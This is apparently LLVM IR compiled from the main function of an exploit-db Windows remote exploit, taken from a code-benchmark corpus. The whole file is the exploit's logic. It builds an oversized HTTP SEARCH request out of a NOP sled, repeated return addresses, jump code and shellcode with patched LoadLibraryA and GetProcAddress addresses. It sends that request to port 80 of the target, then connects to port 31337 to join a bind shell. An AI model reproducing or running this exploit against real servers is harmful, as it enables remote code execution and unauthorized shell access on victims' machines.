; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_51.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_51.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32 }
%struct.sockaddr_in = type { i8*, i8*, i32 }
%struct.sockaddr = type { i32 }

@RET = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [17 x i8] c"Resolving %s .. \00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [14 x i8] c"Unknown host\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"Resolved\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@PORT_OFFSET = common dso_local global i64 0, align 8
@LOADLIBRARYA = common dso_local global i32 0, align 4
@LOADL_OFFSET = common dso_local global i64 0, align 8
@GETPROCADDRESS = common dso_local global i32 0, align 4
@GETPROC_OFFSET = common dso_local global i64 0, align 8
@AF_INET = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [34 x i8] c"[+] Attacking to %s via port: 80\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [24 x i8] c"Failed to create socket\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"Failed to connect\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"SEARCH /\00", align 1
@NOP = common dso_local global i32 0, align 4
@jumpcode = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [12 x i8] c" HTTP/1.1\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [57 x i8] c"Host: %s\0D\0AContent-Type: text/xml\0D\0AContent-Length: %d\0D\0A\0D\0A\00", align 1
@body = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [15 x i8] c"Failed to send\00", align 1
@.str.10 = private unnamed_addr constant [42 x i8] c"[+] Overflow sent, waiting for 5 seconds\0A\00", align 1
@.str.11 = private unnamed_addr constant [29 x i8] c"[+] Connecting to %s: 31337\0A\00", align 1
@.str.12 = private unnamed_addr constant [76 x i8] c"[+] Unable to connect.\0A[+] Exploitation failed, maybe blocked by firewall.\0A\00", align 1
@.str.13 = private unnamed_addr constant [48 x i8] c"[+] Successfull, attempting to join shell ...\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca %struct.sockaddr_in, align 8
  %9 = alloca i16, align 2
  %10 = alloca i64, align 8
  %11 = alloca [100000 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i64, i64* @RET, align 8
  store i64 %17, i64* %10, align 8
  %18 = load i32, i32* %4, align 4
  %19 = icmp ne i32 %18, 2
  br i1 %19, label %20, label %25

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @usage(i8* %23)
  br label %25

25:                                               ; preds = %20, %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i8* %28)
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call %struct.hostent* @gethostbyname(i8* %32)
  store %struct.hostent* %33, %struct.hostent** %6, align 8
  %34 = icmp eq %struct.hostent* %33, null
  br i1 %34, label %35, label %39

35:                                               ; preds = %25
  %36 = load i32, i32* @stderr, align 4
  %37 = call i32 @fprintf(i32 %36, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  %38 = call i32 @exit(i32 -1) #3
  unreachable

39:                                               ; preds = %25
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %41 = call i8* @htons(i32 31337)
  %42 = ptrtoint i8* %41 to i16
  store i16 %42, i16* %9, align 2
  %43 = load i16, i16* %9, align 2
  %44 = zext i16 %43 to i32
  %45 = xor i32 %44, 39321
  %46 = trunc i32 %45 to i16
  store i16 %46, i16* %9, align 2
  %47 = load i16, i16* %9, align 2
  %48 = load i8*, i8** @shellcode, align 8
  %49 = load i64, i64* @PORT_OFFSET, align 8
  %50 = getelementptr inbounds i8, i8* %48, i64 %49
  %51 = bitcast i8* %50 to i16*
  store i16 %47, i16* %51, align 2
  %52 = load i32, i32* @LOADLIBRARYA, align 4
  %53 = xor i32 %52, -1717986919
  %54 = zext i32 %53 to i64
  %55 = load i8*, i8** @shellcode, align 8
  %56 = load i64, i64* @LOADL_OFFSET, align 8
  %57 = getelementptr inbounds i8, i8* %55, i64 %56
  %58 = bitcast i8* %57 to i64*
  store i64 %54, i64* %58, align 8
  %59 = load i32, i32* @GETPROCADDRESS, align 4
  %60 = xor i32 %59, -1717986919
  %61 = zext i32 %60 to i64
  %62 = load i8*, i8** @shellcode, align 8
  %63 = load i64, i64* @GETPROC_OFFSET, align 8
  %64 = getelementptr inbounds i8, i8* %62, i64 %63
  %65 = bitcast i8* %64 to i64*
  store i64 %61, i64* %65, align 8
  %66 = load %struct.hostent*, %struct.hostent** %6, align 8
  %67 = getelementptr inbounds %struct.hostent, %struct.hostent* %66, i32 0, i32 1
  %68 = load i32, i32* %67, align 4
  %69 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %70 = load %struct.hostent*, %struct.hostent** %6, align 8
  %71 = getelementptr inbounds %struct.hostent, %struct.hostent* %70, i32 0, i32 0
  %72 = load i32, i32* %71, align 4
  %73 = call i32 @bcopy(i32 %68, i32* %69, i32 %72)
  %74 = load i8*, i8** @AF_INET, align 8
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i8* %74, i8** %75, align 8
  %76 = call i8* @htons(i32 80)
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i8* %76, i8** %77, align 8
  %78 = load i8**, i8*** %5, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 1
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i8* %80)
  %82 = load i8*, i8** @AF_INET, align 8
  %83 = load i32, i32* @SOCK_STREAM, align 4
  %84 = call i32 @socket(i8* %82, i32 %83, i32 0)
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %89

86:                                               ; preds = %39
  %87 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  %88 = call i32 @exit(i32 -1) #3
  unreachable

89:                                               ; preds = %39
  %90 = load i32, i32* %12, align 4
  %91 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %92 = call i32 @connect(i32 %90, %struct.sockaddr* %91, i32 24)
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %97

94:                                               ; preds = %89
  %95 = call i32 @perror(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i64 0, i64 0))
  %96 = call i32 @exit(i32 -1) #3
  unreachable

97:                                               ; preds = %89
  %98 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %99 = call i32 @bzero(i8* %98, i32 100000)
  %100 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %101 = call i32 @strcpy(i8* %100, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %102 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %103 = call i32 @strlen(i8* %102)
  store i32 %103, i32* %15, align 4
  %104 = load i32, i32* @NOP, align 4
  %105 = trunc i32 %104 to i8
  %106 = load i32, i32* %15, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 %107
  store i8 %105, i8* %108, align 1
  %109 = load i32, i32* %15, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %16, align 4
  br label %111

111:                                              ; preds = %123, %97
  %112 = load i32, i32* %16, align 4
  %113 = load i32, i32* %15, align 4
  %114 = add nsw i32 %113, 2150
  %115 = icmp slt i32 %112, %114
  br i1 %115, label %116, label %126

116:                                              ; preds = %111
  %117 = load i64, i64* %10, align 8
  %118 = trunc i64 %117 to i16
  %119 = load i32, i32* %16, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 %120
  %122 = bitcast i8* %121 to i16*
  store i16 %118, i16* %122, align 1
  br label %123

123:                                              ; preds = %116
  %124 = load i32, i32* %16, align 4
  %125 = add nsw i32 %124, 2
  store i32 %125, i32* %16, align 4
  br label %111

126:                                              ; preds = %111
  br label %127

127:                                              ; preds = %141, %126
  %128 = load i32, i32* %16, align 4
  %129 = load i32, i32* %15, align 4
  %130 = add nsw i32 %129, 65535
  %131 = load i8*, i8** @jumpcode, align 8
  %132 = call i32 @strlen(i8* %131)
  %133 = sub nsw i32 %130, %132
  %134 = icmp slt i32 %128, %133
  br i1 %134, label %135, label %144

135:                                              ; preds = %127
  %136 = load i32, i32* @NOP, align 4
  %137 = trunc i32 %136 to i8
  %138 = load i32, i32* %16, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 %139
  store i8 %137, i8* %140, align 1
  br label %141

141:                                              ; preds = %135
  %142 = load i32, i32* %16, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %16, align 4
  br label %127

144:                                              ; preds = %127
  %145 = load i32, i32* %16, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 %146
  %148 = load i8*, i8** @jumpcode, align 8
  %149 = load i8*, i8** @jumpcode, align 8
  %150 = call i32 @strlen(i8* %149)
  %151 = call i32 @memcpy(i8* %147, i8* %148, i32 %150)
  %152 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %153 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %154 = call i32 @strlen(i8* %153)
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds i8, i8* %152, i64 %155
  %157 = call i32 @strcpy(i8* %156, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  %158 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %159 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %160 = call i32 @strlen(i8* %159)
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8, i8* %158, i64 %161
  %163 = load i8**, i8*** %5, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 1
  %165 = load i8*, i8** %164, align 8
  %166 = load i8*, i8** @body, align 8
  %167 = call i32 @strlen(i8* %166)
  %168 = load i8*, i8** @shellcode, align 8
  %169 = call i32 @strlen(i8* %168)
  %170 = add nsw i32 %167, %169
  %171 = call i32 @sprintf(i8* %162, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.8, i64 0, i64 0), i8* %165, i32 %170)
  %172 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %173 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %174 = call i32 @strlen(i8* %173)
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds i8, i8* %172, i64 %175
  %177 = load i8*, i8** @body, align 8
  %178 = call i32 @strcpy(i8* %176, i8* %177)
  %179 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %180 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %181 = call i32 @strlen(i8* %180)
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds i8, i8* %179, i64 %182
  %184 = call i32 @memset(i8* %183, i32 1, i32 1)
  %185 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %186 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %187 = call i32 @strlen(i8* %186)
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8, i8* %185, i64 %188
  %190 = load i32, i32* @NOP, align 4
  %191 = call i32 @memset(i8* %189, i32 %190, i32 3)
  %192 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %193 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %194 = call i32 @strlen(i8* %193)
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i8, i8* %192, i64 %195
  %197 = load i8*, i8** @shellcode, align 8
  %198 = call i32 @strcpy(i8* %196, i8* %197)
  %199 = load i32, i32* %12, align 4
  %200 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %201 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %202 = call i32 @strlen(i8* %201)
  %203 = call i32 @send(i32 %199, i8* %200, i32 %202, i32 0)
  %204 = getelementptr inbounds [100000 x i8], [100000 x i8]* %11, i64 0, i64 0
  %205 = call i32 @strlen(i8* %204)
  %206 = icmp ne i32 %203, %205
  br i1 %206, label %207, label %210

207:                                              ; preds = %144
  %208 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0))
  %209 = call i32 @exit(i32 -1) #3
  unreachable

210:                                              ; preds = %144
  %211 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.10, i64 0, i64 0))
  %212 = call i32 @sleep(i32 5)
  %213 = load %struct.hostent*, %struct.hostent** %6, align 8
  %214 = getelementptr inbounds %struct.hostent, %struct.hostent* %213, i32 0, i32 1
  %215 = load i32, i32* %214, align 4
  %216 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %217 = load %struct.hostent*, %struct.hostent** %6, align 8
  %218 = getelementptr inbounds %struct.hostent, %struct.hostent* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 4
  %220 = call i32 @bcopy(i32 %215, i32* %216, i32 %219)
  %221 = load i8*, i8** @AF_INET, align 8
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i8* %221, i8** %222, align 8
  %223 = call i8* @htons(i32 31337)
  %224 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i8* %223, i8** %224, align 8
  %225 = load i8**, i8*** %5, align 8
  %226 = getelementptr inbounds i8*, i8** %225, i64 1
  %227 = load i8*, i8** %226, align 8
  %228 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.11, i64 0, i64 0), i8* %227)
  %229 = load i8*, i8** @AF_INET, align 8
  %230 = load i32, i32* @SOCK_STREAM, align 4
  %231 = call i32 @socket(i8* %229, i32 %230, i32 0)
  store i32 %231, i32* %13, align 4
  %232 = icmp eq i32 %231, -1
  br i1 %232, label %233, label %236

233:                                              ; preds = %210
  %234 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  %235 = call i32 @exit(i32 -1) #3
  unreachable

236:                                              ; preds = %210
  %237 = load i32, i32* %13, align 4
  %238 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %239 = call i32 @connect(i32 %237, %struct.sockaddr* %238, i32 24)
  %240 = icmp eq i32 %239, -1
  br i1 %240, label %241, label %248

241:                                              ; preds = %236
  %242 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.12, i64 0, i64 0))
  %243 = load i32, i32* %12, align 4
  %244 = call i32 @close(i32 %243)
  %245 = load i32, i32* %13, align 4
  %246 = call i32 @close(i32 %245)
  %247 = call i32 @exit(i32 -1) #3
  unreachable

248:                                              ; preds = %236
  %249 = load i32, i32* %12, align 4
  %250 = call i32 @close(i32 %249)
  %251 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.13, i64 0, i64 0))
  %252 = load i32, i32* %13, align 4
  %253 = call i32 @shell(i32 %252)
  ret i32 0
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @bcopy(i32, i32*, i32) #1

declare dso_local i32 @socket(i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
